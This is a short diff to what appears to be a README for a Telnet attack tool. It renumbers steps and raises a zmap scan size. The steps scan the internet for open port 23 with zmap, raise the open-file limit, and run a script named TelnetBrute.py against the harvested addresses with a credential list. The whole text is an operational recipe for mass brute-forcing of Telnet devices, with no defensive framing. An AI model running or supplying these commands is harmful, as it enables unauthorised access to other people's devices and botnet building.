@@ -8,13 +8,13 @@ sh zmap_auto_install.sh
 
 - Scan Telnet Ips
 
-zmap -p23 -o mfu.txt -N 15000 
+1- zmap -p23 -o mfu.txt -N 25000 
 
 - Bruteforce 
 
-1- ulimit -n 999999
+2- ulimit -n 999999
 
-2- python TelnetBrute.py mfu.txt 15000 test.txt
+3- python TelnetBrute.py mfu.txt 15000 test.txt
 
 
 
